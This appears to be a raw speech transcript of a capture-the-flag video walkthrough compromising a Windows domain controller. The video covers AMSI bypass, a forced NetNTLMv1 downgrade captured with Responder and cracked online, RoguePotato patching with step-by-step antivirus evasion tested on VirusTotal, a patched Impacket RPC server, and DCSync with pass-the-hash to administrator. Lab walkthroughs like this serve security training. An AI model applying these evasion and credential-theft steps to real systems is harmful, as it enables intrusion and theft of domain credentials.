fix it so i'm going to see if it works gem install evil winrm he said remove it and then reinstall it but i'm going to be lazy and just see if i can install it again so we do this establish a connection and it fix itself so that is where that the input was like that but hey it's fixed now so now we have a shell on this system we can poke around at like the system to see if there's any interesting files here but i don't believe there is other than user.txt and the desktop uh we could also do like get ad user i think administrator is this gonna work um and we can say dash properties star to get me everything about it and you can see cool things like uh password last set so this is just queryable by domain users so we can query that we see administrator was set on september 24th 2020 and if we go back to our secret stump so less backup uh secret stump administrator i'm gonna be really sad if it's like the same date administrator uh password last set september what are these two dates uh let's see sid history that was pwd last set uh 9 24. so the backup was created on september 22nd and then administrator's password was changed two days later so just pretty cool information you can get from querying things but if you want to query everything by hand it's going to take forever so i'm going to run some net tools so i'm just going to google i think shop collection github is this it yeah nightly builds of common.net stuff awesome so hopefully we can run dot net 4.0 because that looks like what this is so cd opt do i have sharp collections here grep i was collection yeah i do not so i'm just going to git clone this to download all these.net binaries and let's see i think we can kill off these cats there we go camper space a little bit so now we have sharp collection and we can do like find dot grab dash ips do we have win ps we do have win ps um i'm gonna go with the oldest first so net framework 4.0 so i'm going to copy this and say menu here and this is going to display the evil winrm menu or i thought it would maybe i should reconnect to winrm because this is okay there we go uh we can do invoke binary and then opt sharp collection net framework win ps.exe and see if this works if it doesn't chances are amsi blocked us which in case we'll run bypass amz and then if it doesn't work yet again chances are we don't have the correct.net version so we can see script blocked by av software so let's try bypass amsi and we say we patched our powershell session so we can run invoke binary now and let's see if windpeas gives us anything i paused the video because it took a little bit but had finished so i'm going to just search my console back for invoke dash so we get back to the top and we can go over this win p's output so let's see we do have a password history file so what i'm going to do is let's just create notes here and we'll say 20 or 30 win ps and we're just going to paste everything we think is interesting so we can copy this and then keep going down um lapse is not installed we kind of know that because the administrative password wasn't changed within 30 days uh lsa protection credential guard cash creds not too interesting here's the environment nothing interesting there hkcu internet settings this would be talking about the proxy if there was one we have the ability to create directories at c colon so this is interesting if there's any unquoted service paths because if there's an unquoted service path that is like hard coded to see colon backslash program space files uh windows if it's not quoted if you create the directory program it'll actually go into program instead of program files it kind of just like has a few things that tries when it comes across a space so that's why i log that let's see uac status current token order login creds we don't have the password um we have access to oh we are that user i don't know why that's interesting i see red and i get excited going down installed applications network shares services we can look at what's listening on like localhost because we may not be able to access that but nothing too interesting we do have some firewall rules so this is why um we couldn't hit the box from ipv4 oh man that that did not paste well uh firewall rules we'll just log that there are rules windows vault powershell commands ran panther this is like a um like windows rsat i think or it installs windows over the network but microsoft longer removed the password that stored left behind but one piece doesn't really find anything there are other windows enumeration tools one famous one is seat belt so i always like running that one as well and let's go back to the net version of 4.0 and we will run seatbelt i'm just going to get rid of that dot slash and this can take some time to run just like win pete or let's see um we probably have to say something so how do we run seat belt seat belt group misc i just want to do all come on seatbelt where is this dash group equals all run all the commands that sounds like what i want see what happens here and now watch because i did this wait what error running command dash group dash group equals all maybe this will work on the plus side we did see the output of seatbelt so we know it does run um given the last one completed in like three microseconds or nanoseconds whatever that is and we don't have output yet i'm assuming it did not want a space it wanted an equal sign so i'm gonna pause the video let this run and we'll see what it tells us it took around five minutes but we do complete it does say 260 seconds right there so let's go to the very top of seat belt and see what we have i'm going to do invoke dash again to get to the top and then we're just going to look so we can't enumerate a av applocker there's this art table audit policy some autoruns telling us we're in vmware our certificates for this user the thumbprints chromium uh credit enumeration can't run credit guard can't run doing some dirs dns cache you can see it's a little bit more painful to go through this output because it's not color coding but at least they do clearly label things um explore run commands file info filezilla hotfixes install products i wonder if we see gigantic host somewhere here um lapse is installed that is a funny install date 11001 i guess that is like install date of nothing or maybe since everything's here um seatbelt aired out trying to pull that date internet settings lapse local groups there's a lot of groups here administrators eh i should take more time and look through that but yeah lol bins let's see lsa settings map drives mcafee named pipes that are running oh we could have went back and if we looked at notes of what we took we never looked at this ps history file just crossed my mind network profiles and tlm settings so we do see lan man compatibility level two and this is super old um this is a requirement to do net ntlm v1 and we can see in session security uh it supports net ntlm v1 so what that is it's a old protocol if you ever crack like net ntlm it's always a v2 hash not a v1 microsoft did something really weird um let's see what is the talk name for this defcon net ntlmv1 there's a good talk about it uh yeah defcon 2012. this is a good talk about it so if you're watching the video and want to know more about this attack instead of just seeing what we do go to this talk because this will be correct information where i may say things that are wrong but essentially the attack is it takes the ntlm hash divides it up into three times and then does a des against each of them and d s itself is weak and since it kind of like divided the hash into three the encryption it did against each one has a small key space and the challenge response if you hard code it it's now vulnerable to rainbow tables so rainbow tables are like pre-computed hashes so instead of doing something like let's say your password is please subscribe the song it should be random before it right so if the salt is always random it's very hard to pre-compute the hash for please subscribe however if the song was um please subscribe for just you please subscribe if this was assault and we can hard code this now we can do a dictionary a pre-computed based attack against this and that's what we're going to be doing with this is we're going to force a net ntlm v1 authentication we're going to set the hash to be like one one two two three three four four five five six six seven seven eight eight i think it's either seven seven or eight eight i forget where it ends but we're gonna set the hash to be that and then we can use an online service to crack the des key because the salt is gonna be the same i think it's salt i may be misusing terms but that is what we do so before we move on uh we should copy this so we have notes of what we did and we can copy go here and i'm going to do seat belt and then we paste this uh i wonder what it looks like in bash let's do enumeration tools enum windpeas seat belt you can look at how this looks and it doesn't look too bad so now we have that um it's gonna be hard to pull off this attack and this is where a lot of like the magic is going to come in because we have to modify mpacket to create like a rpc server to handle this which does get tough actually um let's just do the unintended method first and then we'll do the antenna method because the unintended is easier and before we go modifying a bunch of files i just want to show this works so what this is going to do is going to take advantage of defender being able to scan files on a network share microsoft has fixed this so it no longer works on patched windows but it was a pretty cool like i don't know if it's called an oh day but pretty cool exploit um i don't know if we can do window one like that no cd windows defender go into this we can do mpcmd run.exe dash scan we can say scan type is equal to three which does a file um if you did one it would just be a quick scan two would be a full scan three is scan this file and then we specify the file so we can say 10 10 14 3 slash please subscribe test and now if we run responder responder dash i ton zero and run this command we see we capture this net ntlm v2 hash but we want to do oh wait we capture and net ntl on b1 uh we didn't even have to specify v2 it'll automatically downgrade i guess that's pretty cool the downside is it didn't set the challenge so in order to set the challenge we have to edit the responder config so v etsy responder then responder.com if i do it with sudo and then let's see is there a challenge response we can do custom challenge so instead of challenge at random we can say shoot there we go one one two two three three four four five five six six seven seven eight eight and this is going to do that challenge we had mentioned so now when i run this we can do this oh it's skipping previous hash i don't want that um b responder uh dot responder responder database db responder.db let's see etsy responder spawn.com find.grep i responder dot db locate responder.db if i can type that would help so this is where the responder database is i'm just going to delete it uh sudo there we go so now we can finally run responder again and i'm going to do the flag just so we know we can downgrade ntlm but apparently we don't have to so now we can capture the hash and we have a netantlumv1 hash and this is what the challenge is one one two two three three four four five five six six seven seven eight eight um if we go up to the last time it was just a random thing so if we go to crack.sh this is a online tool to crack dez and we should be able to crack it so if we do get cracking token let's see submit a job see where do we go to crack it was free let's read the instructions so this is talking about capturing with responder let me do this and let's see we get username hostname response response challenge oh these are the same 95895a so it just wants anti-hash response so if we just grab this go back nt hash colon this there we go that is weird that that just auto updates and they'll put root at ipsec.rocks and see if we get this eventually so our job has been queued in the meantime we can check the status here unable to retrieve the status we'll see if we get emailed as we go on but it should email us the password if it decrypts it and it should decrypt it as long as we did everything correct which looks like we did so now while that goes we can go and um i guess log this so i'm just going to do 35 nt hash and i'm going to paste that just so um actually we'll do 100 so we have that and later on when we get this again i'm just going to compare if it is the same because i believe that will since our challenge is hard-coded so let's go and do the piece of this box that i really don't want to do and we'll have to modify rotten potato or rogue potato i should say and we'll also have to modify in packet the rogue potato is the simple one so let's just start there and to do that we have to switch over to windows so you're going to pause the video and go there over on windows i'm going to go to the rogue potato source code so we'll do rogue potato github and we want to allow this to do um ipv6 so let's clone this and then open up in visual studio so let's open folder and we can go to where is it on desktop rogue potato uh maybe open solution project solution that's what i wanted let's go to desktop road potato and we can open this uh don't show again and there is a line here that will set the ip address space so let's see i don't know exactly where it is see is this here see high storage trigger remote ip that's not it let's see what calls remote ip this is gonna be the part of the video that it's probably gonna get hard to follow oh there we go right off the bat so it is defined at 16. and this is indication that it's being treated as a string i believe i don't know exactly what's going on here but an ipv4 address should only be 4 bytes or 32 bits however it's 16. so what i think it's doing is it's got a potential of three characters so it's ip address of 123.123.123.123. and we got uh three periods so this is going to be 15 characters right 16 so maybe they allow like a null byte at the end or just want it to be divisible by two so yeah that's why i think that is length of 16. now an ipv6 is going to be up to um what is it eight groups of four so it would be like a b c d a b c d a b c d and so on so what we want to do is it's eight groups of four which will be eight times 4 is 32 and then we want to wait is it no 8 times 4 is 4 ah math doing it live um 16 plus 16 is 32. yeah i'm right 8 times 4 is 32. so 8 times 4 is 32 and then you have 8 colons or maybe 7 colons i don't know how many colons you have but we'll say 40 is the length so we'll change that 16 to be 40. and now we should have enough space to support ipv6 addresses so let's now build the solution so rebuild and hopefully this builds and we can copy it over to our server come on build generating code rebuilt awesome so we have roguepotato.exe it's in debug let's change it over to release and rebuild uh debug is going to include a lot of things and um i've just had experience where like debug mode wouldn't work but release mode would uh i don't know how to explain off top my head but yeah that's the case it's something with like um statically compiled libraries and things like that so we have rogue potato.exe i'm going to copy this over to my linux machine and we will rename it to just r.exe in case i have a rogue potato elsewhere on my machine we'll know r.exe is the one that has ipv6 so the weirdest thing happened when i was copying this file from my windows vm to this parrot vm i copied from windows to my host os which is also windows and everything was fine and i was copying it from my host os to parrot and defender freaked out and killed my whole parrot vm so i have had to reboot since i copied this but we do have r.exe here and i'm going to copy it up to the machine so i'm going to do evil win rm yet again to get access to it and then i'm going to upload and we have it called r.exe and we're going to try running it and see exactly what happens it should upload just fine because i was in home hdb apt and that is where i've uploaded or put this r.exe so it says it's been successful i'm going to execute it with dot slash r.exe and we get the specified executable is not a valid application i'm gonna do file on it and we see it is 64-bit so i've seen this issue happen before and for some reason sometimes when we upload via winrm it uploads as like utf-16 little endian or something and it doesn't keep the format and windows doesn't recognize it so what i'm going to do is we're going to make a directory dub dub dub and move r.exe into dub dub dub and host it via python3's http server now we can curl 10 10 14 3 port 8000 r.exe or exe so now we should if we specify wait uh 404 not found oh i did not go into dub dub dub there we go so now we should be able to download this executable and when we go to run it we have it contains a virus so we have a little bit of defender evasion to do so generally the very first step to defender evasion is i go to the very beginning of the program and i'm going to search for like the help string this usage and we're just going to replace it we're just going to put please subscribe here because a lot of avs are static signatures based upon strings and for some reason a lot of the strings are based upon the usage it's a stupid thing but doing this mostly will fix av issues so i'm going to build this or rebuild and then i will copy it out of here once it finishes it looks like it's building the oxide resolver now and then rogue potato should finish come on there we go rebuild successful so i'm going to put this on my clipboard so i can copy it over to my host and then we're going to switch over to parrot and drop it over here so drag and drop and we probably should be in the www directory so we'll do that one more time to put it in dub dub dub so now i should be able to curl and we want to call this roguepotato.exe so now when i execute dot slash r.exe uh it still did not work because it contains a virus so the next step i want to do is strings it so we're going to strings roguepotato.exe grep dash i for pot so you can see all the strings of rogue potato i'm going to replace these with please subscribe so let's go back over into a windows vm and i'm going to do a find we're gonna call rogue potato and the very first thing i do when i look for this is i make sure there's no like rogue potato.h files because if i do that this finder place is gonna fail uh horribly i don't see a rogue potato.h so chances are i'm fine i'm gonna put please subscribe there and we are going to replace all replaced 11 occurrences we can save everything and then we go back to rebuild and this takes a few seconds i'm going to go over to my host real quick delete rogue potato so we can copy a new version over and second and i did not expect to have to do this av evasion um it generally worked for me i don't know exactly what changed i'm curious when i look at the write-ups if other people have ran into av issues because when doing it for the first time i did not and the machine hasn't changed since i did it so now we have rogue potato there i'm going to strings and grab for it it's not there if i grab for please subscribe it is starting please subscribe so if you haven't already you should um we can go back to this curl make sure web server is running execute it serra.exe and we still have malware so the next thing i'm going to do and this is the most silly thing ever is we're just going to change compile instructions so i'm going to right click on my project go to properties uh go to c plus plus what is it optimization yeah instead of favorite speed let's favor size so we want the smallest executor possible so both of these let's favorite small code click apply click build rebuild this solution and we're going to see what happens and while this builds um shoot i want to submit to virustotal because whenever i do this type of av evasion i start getting curious at how many things flag it so here's the old one that we just did that we obfuscated a bunch of strings so i'm going to upload this and we'll see what flags and i'm going to upload the second one so we see cyber reason rising i don't know what those are malware bites flags it they are detecting is rogue potato keep in mind um this is the one that we had replaced a bunch of strings in so rogue potato string does not exist in this binary uh if we go into dub dub dub and do a strings on rogue potato gup dash i pot doesn't exist this is the please subscribe one and binaries are still or avs are still detecting it as rogue potato we are nine out of 67 and maybe i can go open another virus turtle and we can submit a second submission maybe just to see what happens when both of these are scanned and this tab is going to be the one that we have ran the optimizations to favor code size so we're going to see what flags we have nine out of 69 with our um like removed all stretches of rogue potato and we still have a few so this is running it's at eight and nine to eight and the one that is missing looks like it's microsoft because microsoft was around here so i expect it to be at the second bottom row and i don't see it so if we look at microsoft it's there so defender i don't know what it was flagging on but when he changed to favor size it could care less so what i'm going to do is i'm going to delete this whole folder what we did actually i'm not going to delete it um that could be like horrible if i want to get back to this and this doesn't work we'll call this dot back i'm going to do a another clone and let's see how many avs detect rogue potato um right off the bat so let's open up rogue potato uh right click open in visual studio 2019 and then we are going to change this to um only favor like size and when we do that we'll compile and upload a virus total to see what happens and we probably should go with a control variable so the control is going to be just a fresh build so we want to see how many avs will detect rogue potato right off the bat so that's why i'm doing this build and it's in debug mode so i'm gonna have to change this into b release i wish i could just like control c out of a build debug is finished so let's restart this with a release and while it compiles we can now change this to be the other thing to speed things up so let's go c plus plus optimization we can change this to be favor size and favor size here apply let's go rogue potato x64 release we're going to upload this so keep in mind this tab over here is going to be our control so i'm just going to drop rogue potato there and confirm upload then we're going to rebuild this because we have now changed the project to favor size instead of speed so let's go to virustotal and if this works like right off the bat it's going to be hilarious and like a lesson on um anti-mass evasion like speed is the devil when you want to evade antivirus you'd be surprised with how many like sand boxes you evade by just putting like a 15 or 30 second sleep before you do your code because you're gonna sleep and the av for some reason decides i'm gonna give up on this code and then move on i don't think that's the case here because i think this like compiler optimization is actually changing like how the bytes get put into the program so that's not the case here but it is funny um come on virus turtle i am not a robot you're gonna make me do like four of these aren't you uh here's buses oh god no there we go that's two sweet so a 20 out of 69 come on for a second i thought i'd get away with only doing two um there's a sidewalk so 20 both times um uh what the heck undetected um if you're watching this video like i haven't put any sneaky cuts in uh this doesn't make sense to me because i compiled it one time it got detected i changed some compile option well i compiled it it got detected and then i removed a bunch of strings still got detected i chained some compile options didn't get detected then i created the project again did a fresh compile and it went back to being undetected i have no idea why that time it didn't my only thought is maybe i changed the project properties before it got to this rogue potato file and it took them so my control may be off so maybe like i said speed is the devil when you want to evade av so this is the new control we're just going to build rebuild to see what flags it um i wish i left that open because i could have seen like the hashes uploaded to see if that file was the same but let's just go to x64 release and wait for roguepotato.exe but good news is we know when you favor the file size defender doesn't flag it so here we go here's definitely one that we haven't made any changes to and we were 20 out of like 69 i want to say so we'll see what we are now this is just a vanilla rogue potato there's no chance of any modifications if defender doesn't flag it like i don't understand av evasion one bit anymore so come on let's see what you analyze uh there we go microsoft flagged it that's good yes so microsoft flagged it we're at 22 now so there's quite a few uh there's three avs that just favoring size decided not to flag um i did not copy the rogue potato after changing this so i probably should so we'll do this i'm sorry guys uh let's do this one more time to favor size uh favorite size and favorite small code there we go because i forgot to grab the binary after uploading it so if you didn't believe me before we're doing this step again and then that will be it for av evasion for this video so thank you for sticking through with it and maybe you just got bored and you clicked on the next topic because i do put those little topics in so you can skip around in these videos so let's copy this put it here we got rogue potato.exe come on virus total confirm upload and we're going to wait to see so it's done and there's 20. i'm not going to say which ones it didn't detect i just know microsoft is not on this detected list because microsoft is where are you right there so if you want to do your own detection look here and then look here um one of zillia and viper and rising uh oh wow i just guessed and the bottom two zillia viper and microsoft so there you go there's the three that didn't detect uh were zillia zelia's here and viper those detected it previously along with microsoft so we can now copy a rogue potato copy it to my host machine copy and replace and we're going to go over to parrot and we're going to place rogue potato but first i'm going to delete it so i know we get this new one copy it here and for sake of explanation please subscribe is not there it is rogue potato all throughout this binary so let's do this curl again and we're going to execute our.exe and it now executes we can specify netcat to listen on port 135 with sudo of course and then we're going to specify dash r for remote and then our ip address which is ipaddr and we want to do the ipv6 address which is dead beef so we'll copy this and then dash e to run a command the command is not going to work because we don't have sem personate privilege but just because we don't have sc impersonate privilege that means we can't take ownership of the token and run a command but we can still have it authenticate to us because that happens before we take ownership of the token and because it's authenticating over net intel mv1 we can crack the hash and get the ntlm so we run this and oh come on demo gods do you have to do this to me uh why did you not work um it's listening on i really don't know now specify six let's also use netcat instead of nc even though it's the same based upon this um shoot uh maybe it's port 139 or something i guess we listen on all the ports and see lvmp-6 445. um sudo lvmp we'll do six here nc-6lvnp 139 one of these should work oh i am a total buffoon so remember like to show av evasion i redownloaded it um i forgot to edit it again so let's go back to the storage trigger uh where is the 16 right here we want to change this to be 40. save it build rebuild so if you don't do this um you'll see the error message i guess um totally planned that i made this mistake this is not improvisation at all let's copy this rogue potato hopefully you don't view this as me wasting your time going through all these mistakes cause this is a relatively unique part of the box and this whole net ntlm downgrade i've done it before in environments generally not against windows machines because you probably never see this configuration but that being said there are other things where you would see this configuration such as like um nas's like uh like attached storage hardware devices things like that that love supporting everything that's where you start seeing this type of stuff or even a printer i've got a printer like because printers send scan jobs to um smb shares i've got to connect to my smb share and do a net ntlm v1 before so uh yeah that's where you'd start seeing these things so now we have this new one and there we go we got a connection on 135 all is right in the world um if we just use responder again it's not going to work because the responder is going to switch over to um smb which is blocked so if we do this dash lm we probably have to do sudo we can run this again and it just doesn't work um now i'm pretty sure that's because it's got to connect back over smb so now is going to be the hard part of this video and that is uh editing in packet to do all of our shenanigans that we want to do so the very first step is to download impacted but before we do let's find a patch that we want to apply to make impact be a rpc server so i'm going to google impacted rpc server client and there should be a gist that comes up and this is going to be the patch that we do so i'm just going to w get not h that yep so we download that patch so this patch was september 9th 2020 so i'm going to go to unpack it so we're going to do github um and packet and we're just going to clone this so get clone and packet i'm going to copy this patch into impact and we're gonna go over to these commits and go back to around september because that's probably the patch this was applied on unfortunately the diff i don't think it supplies the um get commit id uh i went away from it so we just kind of have to guess on how to do this so git commit we'll copy this one and go here because this is also on september 9th actually let's say he did not pull the same day let's go back one day so he pulled it the day before he was working with it he did some things and that's the commit we work out with so get check out the commit we're now on this branch so we can apply the patch so get apply white space we want to fix and apply this patch let's see and we get an error message some things already exist so maybe this got put into impacted's library or something but whenever i see libraries exist and i'm trying to apply this patch i want to go back and this is the part where like me and oxdf have spent so long trying to get this exploit to work what i know works is if we go back to in packet go to the release and we grab the previous release which is 9021 why do not show and packet releases and we'll start with this one 9021 come on where's the download i click you there we go so let's download this entire zxvf and pack it and then let's copy this rpc patch into impact and if we apply it it's going to probably error still but the error we can easily fix so it's airing right here on dce rpc version 5 rpc crt and it's expecting to find this file this msrpc thing so if we delete this directory we may not have to do this but because the patch failed to apply i just want to redo it so we'll copy the patch back into the in packet directory go into the in packet directory and vi there's in packet dc erpc version 5 rp cert crt okay and it wanted something here this msrbc rts 0x14 so i put this file here so the patch has it and we're going to get apply [Music] and see if there's any error messages uh what did not save or did like i not put the same line break it expected that was unexpected copy rm-rf and packet guitar cp go in vi uh add this line save save save apply okay it's not airing i don't know what i did wrong there but now we finally got this patch applied so once you run the patch make sure it applies and the hard part is not even started yet we have to make some edits so let's go into in packet examples ntlm relay x rpc uh is it client uh no servers then rpc relay server i'm going to make some changes so if we go to do ntlab negotiate uh we have we're gonna change this like entire function because what it's at right now is doing like an ntlm relay attack and we don't care about that we could probably work it and do both but um like i'm lazy and i don't want to try to understand this code so we delete most of everything i'm going to keep that like if then error check in but yeah i think that's good so what we want to do is do a self.client is equal to smb relay client dot smb relay client self.server.config and self.target and self is passed into this and this part probably won't make sense because i don't know like unless i do a multiple hour video i don't know how we can explain this piece well um we just imported the or used the smb relay client so we have to import it so from impacted.examples antilum relay x clients import um smb relay client and if you don't know what these periods are these are just directories so if we do ls and packet examples and tlm that's all we're doing is going in so we go back to this do ntlm negotiate function and we still do a lot of things so the very first thing is we want to send the negotiate so what this did was we get a request on our pc and we're going to change it over to smb uh we could probably do this all in rpc if we're good coders i am not a good programmer so i converted to what i could figure out how to get working which was smb so we got to make this self.challenge message and that is just self client send negotiate token and then on this challenge message there is a value of challenge and this is where we set that uh one one two two thing so bytes from hex one one two two three three four four five five six six seven seven eight eight it goes all the way up to eight okay and then this next part is gonna be confusing we're gonna do data is equal to byte array self dot challenge message dot get data and that's going to get the data of this and we actually have to change something in this we have to disable um ess i forget exactly what ess is but if you look at like drop the mic attack it will come up so we xor it with 0xf7 which is ntlmssp disable ess so this bit in this is the flag for ess and if we go to google we can say like drop the mic uh zrxf7 probably come up uh shoot ntlm ssp ess uh drop the mic let's do smb 0x f7 it should be in one of these attacks i can't find it on google right now and i hope xerox f7 is what i'm looking for but this piece of code probably doesn't make sense and this is where like the box becomes insanely hard if you want to do it the intended way so we change the challenge message now to equal bytes data so um convert to smb set challenge to crackable and disable ess okay so that piece is done the next piece of code we have to do is in the handshake so i'm going to search for message type uh if i can type message type there we go and it's going to be each like when we receive a message what we do so that's the auth negotiate this is the auth challenge and then this is challenge response this is what we want to edit because this is going to be after the client authenticates to us so we're going to pretty much delete everything after this because after this code things don't matter anymore because we already got the message so i'm just going to remove those um let's see the exception i don't know where this try is so i'm just going to remove that as well and that looks better and we're going to use a function that we have imported earlier this is well we didn't import it it started out we have output to john format so let's go back to message type and we will want to do ntlm hash data is equal to output to john format then bytes dot from hex one one two two three three four four five five six six seven seven eight eight and then for readability we can split this on multiple lines we're going to have to grab four things the username domain lanman and ntlm so authenticate message then user underscore name i'm just going to yank this line and put it four times so we can do the domain name and then land man and then the last one is ntlm okay and we just want to print data i'm just going to do a log message i'm going to use log.error to stand out so log.error i'm going to say ntlm data and the hash string this is part of the output to john thing and l tlm data hash underscore version there we go so now on the response we're logging this and we can try it running this to see if it works um spoiler it's not going to work yet but it doesn't hurt to try uh let's see oh we have to create our actual rfpc script so i'm going to take pretty much an example uh let's see examples ntlm relay x if we maybe go to oh and packet examples ntlm relay x clients and is there a rpc relay client we're pretty much going to take this but this is a lot of code and when doing things it's nice to have as little lines as possible because if there's something that goes wrong there's less parts to like step through your break point and now and their clients i think this had like some um send negotiate messages which we don't need because uh yeah so i'm just going to create a new one i'm going to less on this example because it's probably got a lot of imports that i want uh let's see does this actually well there's a different example if we go to examples do we have any rpc that's rpc dump um let's see or there's examples ntlm what is it nt lm relay maybe this one's a better example to go from looking at these imports it is but we have this like mini shell that we don't want to do and yeah this is pretty much the example i was looking for but a lot more options than we need and i don't want to put a bunch of like command line arguments because this is our quest right here where it's like do we support smb2 support and that's if in back it you do smp2 support then it will add it there to be true so let's grab this uh we probably don't need that sock server uh just going to grab all of these copy v rpc task.pi i guess and set mode to paste paste this in we don't need url lib so we can delete that probably don't need json or threading threading is like the devil when you're trying to do anything we don't need cmd cmd is like that command line wrapper where the mini shell was uh version we probably don't need that we don't need http relay server but we should be fine let's do logger.init to initialize our logger and now we can set the logger to be debug level so logging.getlogger dot set level so we did this because we want to get in packet logs and i want to get all the impacted logs so i just have to debug now we're going to do what we saw in that other script the c equals thing if we go here c equals this ntlm relay config and i'm going to hand pick a bunch of options i want out of here so we're going to do c equals ntlm relay config and it's relay xconfig and we want to do c dot set encoding sys dot get default encoding and c dot smb to support to be true because we are relaying from an rpc connection back to smb for simplicity and set listening port to be 135 so impact will listen on port 135 and then c dot set interface ip and it's like lowercase if we just set this it's going to listen on all interfaces and then c dot set ipv6 to be true now we can pretty much start this so server is equal to rpc relay server c i type for that relay server c and then s dot run okay so that's good now the last thing we want to do is start a virtual environment so we can install this and pack it and just have everything good so i'm going to do python dash m vm vm and that creates this directory virtual m where we can install all the libraries so i'm going to do source vm bin activate and then we can do pip install dasher requirements.text this will install everything we need for in packet to run i'm not sure if there's anything i don't have already on my host that wouldn't be in this but yeah so successfully installed so let's run python3 or we call it rpc test.pi uh no directory impact dot do i even type that the rpc test uh typo where is this i probably type this in somewhere else pepper i yeah type it in this file there we go run this uh smb to support i probably have the casing wrong on this so let's see it's probably lowercase s uh lowercase mb i mean oh it's set smb2 support that's what it is permission denied because we have to listen on that socket there we go we set up the rpc server so i'm going to switch over to this pane and let's do python three or a piece uh we have to go cd and packet source vm bin activate i'm just doing it on this pane so um we can see things better rpc so now when we connect to this we get an error message so now we have to start debugging so i'm going to grab this and then we'll edit this file and what line was that on uh let's see this line is 60 right here this is the arrow we're looking at so let's go to line 60 and see what this is so we're looking at this setup block right here and the error said client address doesn't exist if we look elsewhere in the code like this i believe initialization function we have a client underscore address and this log message we have a self.client underscore address i'm guessing that's what we need so i'm going to replace this with self. client underscore address and we will continue on so let's run this and now we got a different error no bull replace and this one is let's see in line 61 in this so let's go here 61 and it's saying no bull replace right here so i'm going to do import pdb and then pdb.set underscore trace save this and i want to look at what um get target is so i'm going to grep dash r i'm going to do def get target to see what file this is in so we can see a little bit about it it's probably going to be this ntlm relay thing not net view so let's grab this hit target and let's see should have another way to list failed attempt with user identity so i'm not sure what this code is doing but we may want to try changing get target to be none we don't know what get target is but we have identity is equal to none right there so let's go and run the code again we have the breakpoint in so if we go back to what is it line 50ish we have the break point here so we should be good it's going to less this and get target just want to copy this command run it again we should go into pdb and i didn't have to copy it because it shows what the next line will be but we can look at this and we have boolean object has no attribute replace so what is this self server config random targets we look at this it is set to false so what would happen if we just instead called git target with none and we get something first uh we have scheme smb net location dead beef uh this looks like to be the server address because my ipv6 address i think ends in like um 1001 we do ipaddr my ip ends in yeah 1001 for ipv6 so this is the server's ip so let's set get target to none and see what happens uh type reset because my terminal got kind of janky so let's go back here see where is this we can delete that breakpoint and we want to set this to none okay we go back run it and see what happens we still get error messages and this one is in line 63 of this none type has no attribute scheme so let's look at this file vi on this 63. and we don't have a self.target scheme so what i'm going to do is we'll just remove a lot of this and just leave a received connection from and we'll say self dot client underscore address zero then we delete this line we probably need from percent s was it like that that looks better run the code yet again and we have an error somewhere in negotiate ntlm session so let's again we'll go here bi uh what line is it 174 c this one i don't know exactly where this air is coming from try compute the challenge see if we go back to do and tlm negotiate i'm guessing we do something in this function to get there see okay yeah i was looking down here um we won't look at this so a net connection has no attribute so 197. let's see self.client let's just try moving this line up because we have self.client being defined here and this is doing self.client initiate connection and we're saying self.client creates this smb client from this server config so let's run this start and we still get an error message this is going to be in a different spot though uh none type no attribute host name so line 31 of init and let's set a breakpoint here so it doesn't know what target.hostname is right here that was what that error was so if we do target target dot first name uh let's step so let's see target i don't know why i can't see what that variable is okay am i where i think i am okay i'm still internet and we have target and we look at first hostname it is dead so what's happening here is something hilarious uh because this library i guess doesn't expect ipv6 in ipv4 you do an ip address call in the port number so they created the function hostname to say okay let's just split the netlocation upon a colon and the hostname is gonna be the very first one and i guess there's probably a target port target dot uh yeah the port is everything else so um yeah so they said okay everything up before the first colon is gonna be the host name everything after is going to be the port and this is wrong in ipv6 um ipv6 correct socket is typed like you put the ip address within brackets and then colon the port but it's not doing that so we have to fix that let's go here uh it was right here so what i'm going to do is we'll say ip is equal to um what is it target.net location and we're going to replace so dot replace colon 445 with nothing so we're just saying strip out the port and that'll be the ip address so target host can now be ip and then target.port um when we tried using target.port there it aired because it thought port was like beef colon a bunch of things and that's not valid so let's just get rid of that and say self.targetport is equal to uh we'll try targetport and see what happens there and then self.target i don't know what's different between target and target host i wonder if we can just leave that there let's uh set a breakpoint again import pdb pdb.set trace run this again first we have to start a server this may have to timeout there we go so ip we do ip it's dead beef whatever that looks good let's step in target port 445 looks good target target is this whole thing extend security none session data we continue uh we get the hash success um we screwed up some things though let's see message say log error where did log error fail not all arguments converted during strength formatting what if i just try printing instead of doing a log message let's see this is an rpc relay server 189. let's just print sometimes when doing logging if you give it weird things um it behaves oddly and this behaved oddly oh wait we have this debug let's get rid of that debug so that was in a net pdb we can delete that so we're getting the hash uh there's still an error message something doesn't have net location i wonder if this is the target if i edit this i'm going here i want to target if we just give it ip if that's fine but right now we don't have to fix it because even though it aired it continued and eventually gave us this hash and we can see the um hash versions and tlm but this is what we want the hash string if we copy this go back to our obsidian notes go to nth this 95 ac it is the same so remember this is what we did a long time ago in the video with the defender hash we'll use defender to grab that so let's see the i think i fixed that let's run this again do we get any error messages we do uh no attribute net location so let's see if 445 in target.net location else ip is equal to target.net location so what i think this a message thing is um this ip it tried to replace net location and it didn't exist maybe so i'm checking if 445 is ended to begin with run type okay we're screwing something up i don't know exactly what it doesn't matter because the program still works uh try this is the lazy way except pass local ip let's see except b is equal to target.net location is that going to work yeah i'm not exactly sure why it's erroring um but it doesn't really matter because we do get our hash string so now i guess the final part of this video is going into my email to show you the crack.sh service did respond so let's do that and here we are at my email i did pause the video after i did the defender stuff because i just had things to do so 13 hours ago we can see it was submitted and then also 13 hours ago you can see it took it 30 seconds to crack that net ntlm v1 hash and it got the key which is this and this key is actually the ntlm hash of the account so if we now do um let's say secretsdump.pi and say dash hashes i think paste paste and then apt dollar 10 10 10 or uh let's see the username is going to be apt and then the host is going to be apt i wonder if we do at there we go and it is going to log in successfully and we do the dc sync so we have henry vincent's but we also have uh administrator and we can try administrator and now we can use this one to ps exact so ps exec dot pi hashes and then cmd administrator at apt cmd uh let's see did not work because i type it administrator we go and it's uploading the file come on i wonder if defender's catching this it shouldn't there we go now it's starting service it's taking its way time i guess the like longest running ps exec is a watched one uh we could probably use like smb client or something to grab this and there is one last piece of this video i wanted to get into and that was um the crack map exec does support ipv6 if you do a later version why don't you start the service let's just restart this is it going to go quick if i restart requesting shares uploading starting service come on we may want to do wmi exec i'm going to copy this we can try wmi we'll paste this doing my exact dot pi let's see if this works part of me is wondering if like um it just doesn't like ipv6 let's see exit out of this i think when rm does this support hashes let's see password hash yeah it does i'm going to do dash capital h paste this hash we'll try administrator uh invalid hash format there you go wait what c37 and it ends in oh i just grabbed up there we want this okay hash paste connect there we go we're administrator and if we go into desktop we can get root.text so that'll pretty much be the video we're gonna go and clean up notes uh we got a lot of like crap to do because we didn't do a great job with that impacted stuff so let's see 